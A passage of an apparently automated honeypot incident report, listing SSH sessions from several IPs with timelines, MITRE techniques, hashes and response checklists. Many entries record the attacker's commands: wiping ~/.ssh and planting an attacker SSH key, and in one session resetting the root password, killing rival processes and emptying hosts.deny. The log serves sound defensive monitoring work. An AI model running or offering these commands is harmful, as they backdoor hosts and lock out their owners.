|---|---|
| **Source IP** | `196.92.7[.]249` |
| **First Seen** | 2026-05-20 20:08 |
| **Last Seen** | 2026-05-20 20:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:08:36` | `cowrie.session.connect` |
| `2026-05-20 20:08:36` | `cowrie.client.version` |
| `2026-05-20 20:08:36` | `cowrie.client.kex` |
| `2026-05-20 20:08:37` | `cowrie.login.success` |
| `2026-05-20 20:08:38` | `cowrie.session.params` |
| `2026-05-20 20:08:38` | `cowrie.command.input` |
| `2026-05-20 20:08:38` | `cowrie.command.failed` |
| `2026-05-20 20:08:38` | `cowrie.log.closed` |
| `2026-05-20 20:08:38` | `cowrie.session.params` |
| `2026-05-20 20:08:38` | `cowrie.command.input` |
| `2026-05-20 20:08:38` | `cowrie.session.file_download` |
| `2026-05-20 20:08:38` | `cowrie.log.closed` |
| `2026-05-20 20:08:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]249` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7f48487d32c

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]249` |
| **First Seen** | 2026-05-20 20:08 |
| **Last Seen** | 2026-05-20 20:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:08:41` | `cowrie.session.connect` |
| `2026-05-20 20:08:41` | `cowrie.client.version` |
| `2026-05-20 20:08:41` | `cowrie.client.kex` |
| `2026-05-20 20:08:41` | `cowrie.login.success` |
| `2026-05-20 20:08:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]249` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21cf76bb8f96

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-20 20:09 |
| **Last Seen** | 2026-05-20 20:09 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:09:38` | `cowrie.session.connect` |
| `2026-05-20 20:09:38` | `cowrie.client.version` |
| `2026-05-20 20:09:38` | `cowrie.client.kex` |
| `2026-05-20 20:09:39` | `cowrie.login.success` |
| `2026-05-20 20:09:39` | `cowrie.session.params` |
| `2026-05-20 20:09:39` | `cowrie.command.input` |
| `2026-05-20 20:09:39` | `cowrie.command.failed` |
| `2026-05-20 20:09:39` | `cowrie.log.closed` |
| `2026-05-20 20:09:39` | `cowrie.session.params` |
| `2026-05-20 20:09:39` | `cowrie.command.input` |
| `2026-05-20 20:09:39` | `cowrie.session.file_download` |
| `2026-05-20 20:09:39` | `cowrie.log.closed` |
| `2026-05-20 20:09:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f10b2fa5514

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]249` |
| **First Seen** | 2026-05-20 20:09 |
| **Last Seen** | 2026-05-20 20:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:09:43` | `cowrie.session.connect` |
| `2026-05-20 20:09:43` | `cowrie.client.version` |
| `2026-05-20 20:09:43` | `cowrie.client.kex` |
| `2026-05-20 20:09:44` | `cowrie.login.success` |
| `2026-05-20 20:09:44` | `cowrie.session.params` |
| `2026-05-20 20:09:44` | `cowrie.command.input` |
| `2026-05-20 20:09:44` | `cowrie.command.failed` |
| `2026-05-20 20:09:45` | `cowrie.log.closed` |
| `2026-05-20 20:09:45` | `cowrie.session.params` |
| `2026-05-20 20:09:45` | `cowrie.command.input` |
| `2026-05-20 20:09:45` | `cowrie.session.file_download` |
| `2026-05-20 20:09:45` | `cowrie.log.closed` |
| `2026-05-20 20:09:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]249` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fddd2dbed74d

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:09 |
| **Last Seen** | 2026-05-20 20:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:09:46` | `cowrie.session.connect` |
| `2026-05-20 20:09:46` | `cowrie.client.version` |
| `2026-05-20 20:09:46` | `cowrie.client.kex` |
| `2026-05-20 20:09:47` | `cowrie.login.success` |
| `2026-05-20 20:09:48` | `cowrie.session.params` |
| `2026-05-20 20:09:48` | `cowrie.command.input` |
| `2026-05-20 20:09:48` | `cowrie.command.failed` |
| `2026-05-20 20:09:48` | `cowrie.log.closed` |
| `2026-05-20 20:09:49` | `cowrie.session.params` |
| `2026-05-20 20:09:49` | `cowrie.command.input` |
| `2026-05-20 20:09:49` | `cowrie.session.file_download` |
| `2026-05-20 20:09:49` | `cowrie.log.closed` |
| `2026-05-20 20:09:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bad6e5c8b05d

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]247` |
| **First Seen** | 2026-05-20 20:09 |
| **Last Seen** | 2026-05-20 20:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:09:47` | `cowrie.session.connect` |
| `2026-05-20 20:09:47` | `cowrie.client.version` |
| `2026-05-20 20:09:47` | `cowrie.client.kex` |
| `2026-05-20 20:09:48` | `cowrie.login.success` |
| `2026-05-20 20:09:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]247` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]247` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-077629976b1c

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-20 20:09 |
| **Last Seen** | 2026-05-20 20:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:09:48` | `cowrie.session.connect` |
| `2026-05-20 20:09:48` | `cowrie.client.version` |
| `2026-05-20 20:09:49` | `cowrie.client.kex` |
| `2026-05-20 20:09:49` | `cowrie.login.success` |
| `2026-05-20 20:09:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f44e37158251

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:09 |
| **Last Seen** | 2026-05-20 20:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:09:52` | `cowrie.session.connect` |
| `2026-05-20 20:09:52` | `cowrie.client.version` |
| `2026-05-20 20:09:52` | `cowrie.client.kex` |
| `2026-05-20 20:09:53` | `cowrie.login.success` |
| `2026-05-20 20:09:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30fb9414ab0d

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 20:10 |
| **Last Seen** | 2026-05-20 20:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:10:11` | `cowrie.session.connect` |
| `2026-05-20 20:10:11` | `cowrie.client.version` |
| `2026-05-20 20:10:11` | `cowrie.client.kex` |
| `2026-05-20 20:10:12` | `cowrie.login.success` |
| `2026-05-20 20:10:13` | `cowrie.session.params` |
| `2026-05-20 20:10:13` | `cowrie.command.input` |
| `2026-05-20 20:10:13` | `cowrie.command.failed` |
| `2026-05-20 20:10:13` | `cowrie.log.closed` |
| `2026-05-20 20:10:13` | `cowrie.session.params` |
| `2026-05-20 20:10:13` | `cowrie.command.input` |
| `2026-05-20 20:10:13` | `cowrie.session.file_download` |
| `2026-05-20 20:10:13` | `cowrie.log.closed` |
| `2026-05-20 20:10:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6feac41171b9

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 20:10 |
| **Last Seen** | 2026-05-20 20:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:10:16` | `cowrie.session.connect` |
| `2026-05-20 20:10:16` | `cowrie.client.version` |
| `2026-05-20 20:10:16` | `cowrie.client.kex` |
| `2026-05-20 20:10:17` | `cowrie.login.success` |
| `2026-05-20 20:10:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bb9258ff842

| Field | Detail |
|---|---|
| **Source IP** | `154.144.225[.]226` |
| **First Seen** | 2026-05-20 20:10 |
| **Last Seen** | 2026-05-20 20:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:10:53` | `cowrie.session.connect` |
| `2026-05-20 20:10:53` | `cowrie.client.version` |
| `2026-05-20 20:10:53` | `cowrie.client.kex` |
| `2026-05-20 20:10:54` | `cowrie.login.success` |
| `2026-05-20 20:10:54` | `cowrie.session.params` |
| `2026-05-20 20:10:54` | `cowrie.command.input` |
| `2026-05-20 20:10:54` | `cowrie.command.failed` |
| `2026-05-20 20:10:55` | `cowrie.log.closed` |
| `2026-05-20 20:10:55` | `cowrie.session.params` |
| `2026-05-20 20:10:55` | `cowrie.command.input` |
| `2026-05-20 20:10:55` | `cowrie.session.file_download` |
| `2026-05-20 20:10:55` | `cowrie.log.closed` |
| `2026-05-20 20:10:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.144.225[.]226` to AbuseIPDB if not already reported
- [ ] Block `154.144.225[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac581a79998e

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]247` |
| **First Seen** | 2026-05-20 20:10 |
| **Last Seen** | 2026-05-20 20:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:10:57` | `cowrie.session.connect` |
| `2026-05-20 20:10:57` | `cowrie.client.version` |
| `2026-05-20 20:10:57` | `cowrie.client.kex` |
| `2026-05-20 20:10:58` | `cowrie.login.success` |
| `2026-05-20 20:10:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]247` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]247` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f3330912af6

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-20 20:11 |
| **Last Seen** | 2026-05-20 20:11 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:1qSvgwxYZEDt"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:11:35` | `cowrie.session.connect` |
| `2026-05-20 20:11:35` | `cowrie.client.version` |
| `2026-05-20 20:11:35` | `cowrie.client.kex` |
| `2026-05-20 20:11:35` | `cowrie.login.success` |
| `2026-05-20 20:11:36` | `cowrie.session.params` |
| `2026-05-20 20:11:36` | `cowrie.command.input` |
| `2026-05-20 20:11:36` | `cowrie.command.failed` |
| `2026-05-20 20:11:36` | `cowrie.log.closed` |
| `2026-05-20 20:11:36` | `cowrie.session.params` |
| `2026-05-20 20:11:36` | `cowrie.command.input` |
| `2026-05-20 20:11:36` | `cowrie.session.file_download` |
| `2026-05-20 20:11:36` | `cowrie.log.closed` |
| `2026-05-20 20:11:47` | `cowrie.session.params` |
| `2026-05-20 20:11:47` | `cowrie.command.input` |
| `2026-05-20 20:11:47` | `cowrie.log.closed` |
| `2026-05-20 20:11:48` | `cowrie.session.params` |
| `2026-05-20 20:11:48` | `cowrie.command.input` |
| `2026-05-20 20:11:48` | `cowrie.log.closed` |
| `2026-05-20 20:11:48` | `cowrie.session.params` |
| `2026-05-20 20:11:48` | `cowrie.command.input` |
| `2026-05-20 20:11:48` | `cowrie.session.file_download` |
| `2026-05-20 20:11:48` | `cowrie.log.closed` |
| `2026-05-20 20:11:48` | `cowrie.session.params` |
| `2026-05-20 20:11:48` | `cowrie.command.input` |
| `2026-05-20 20:11:49` | `cowrie.log.closed` |
| `2026-05-20 20:11:49` | `cowrie.session.params` |
| `2026-05-20 20:11:49` | `cowrie.command.input` |
| `2026-05-20 20:11:49` | `cowrie.log.closed` |
| `2026-05-20 20:11:49` | `cowrie.session.params` |
| `2026-05-20 20:11:49` | `cowrie.command.input` |
| `2026-05-20 20:11:49` | `cowrie.command.input` |
| `2026-05-20 20:11:49` | `cowrie.log.closed` |
| `2026-05-20 20:11:50` | `cowrie.session.params` |
| `2026-05-20 20:11:50` | `cowrie.command.input` |
| `2026-05-20 20:11:50` | `cowrie.log.closed` |
| `2026-05-20 20:11:50` | `cowrie.session.params` |
| `2026-05-20 20:11:50` | `cowrie.command.input` |
| `2026-05-20 20:11:50` | `cowrie.log.closed` |
| `2026-05-20 20:11:50` | `cowrie.session.params` |
| `2026-05-20 20:11:50` | `cowrie.command.input` |
| `2026-05-20 20:11:50` | `cowrie.log.closed` |
| `2026-05-20 20:11:51` | `cowrie.session.params` |
| `2026-05-20 20:11:51` | `cowrie.command.input` |
| `2026-05-20 20:11:51` | `cowrie.log.closed` |
| `2026-05-20 20:11:51` | `cowrie.session.params` |
| `2026-05-20 20:11:51` | `cowrie.command.input` |
| `2026-05-20 20:11:51` | `cowrie.log.closed` |
| `2026-05-20 20:11:51` | `cowrie.session.params` |
| `2026-05-20 20:11:51` | `cowrie.command.input` |
| `2026-05-20 20:11:52` | `cowrie.log.closed` |
| `2026-05-20 20:11:52` | `cowrie.session.params` |
| `2026-05-20 20:11:52` | `cowrie.command.input` |
| `2026-05-20 20:11:52` | `cowrie.log.closed` |
| `2026-05-20 20:11:52` | `cowrie.session.params` |
| `2026-05-20 20:11:52` | `cowrie.command.input` |
| `2026-05-20 20:11:52` | `cowrie.log.closed` |
| `2026-05-20 20:11:53` | `cowrie.session.params` |
| `2026-05-20 20:11:53` | `cowrie.command.input` |
| `2026-05-20 20:11:53` | `cowrie.log.closed` |
| `2026-05-20 20:11:53` | `cowrie.session.params` |
| `2026-05-20 20:11:53` | `cowrie.command.input` |
| `2026-05-20 20:11:53` | `cowrie.log.closed` |
| `2026-05-20 20:11:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc30fdc1aa58

| Field | Detail |
|---|---|
| **Source IP** | `45.78.198[.]19` |
| **First Seen** | 2026-05-20 20:11 |
| **Last Seen** | 2026-05-20 20:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:11:49` | `cowrie.session.connect` |
| `2026-05-20 20:11:49` | `cowrie.client.version` |
| `2026-05-20 20:11:49` | `cowrie.client.kex` |
| `2026-05-20 20:11:49` | `cowrie.login.success` |
| `2026-05-20 20:11:49` | `cowrie.session.params` |
| `2026-05-20 20:11:49` | `cowrie.command.input` |
| `2026-05-20 20:11:49` | `cowrie.command.failed` |
| `2026-05-20 20:11:49` | `cowrie.log.closed` |
| `2026-05-20 20:11:50` | `cowrie.session.params` |
| `2026-05-20 20:11:50` | `cowrie.command.input` |
| `2026-05-20 20:11:50` | `cowrie.session.file_download` |
| `2026-05-20 20:11:50` | `cowrie.log.closed` |
| `2026-05-20 20:11:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.78.198[.]19` to AbuseIPDB if not already reported
- [ ] Block `45.78.198[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d482b965b7d

| Field | Detail |
|---|---|
| **Source IP** | `45.78.198[.]19` |
| **First Seen** | 2026-05-20 20:11 |
| **Last Seen** | 2026-05-20 20:11 |
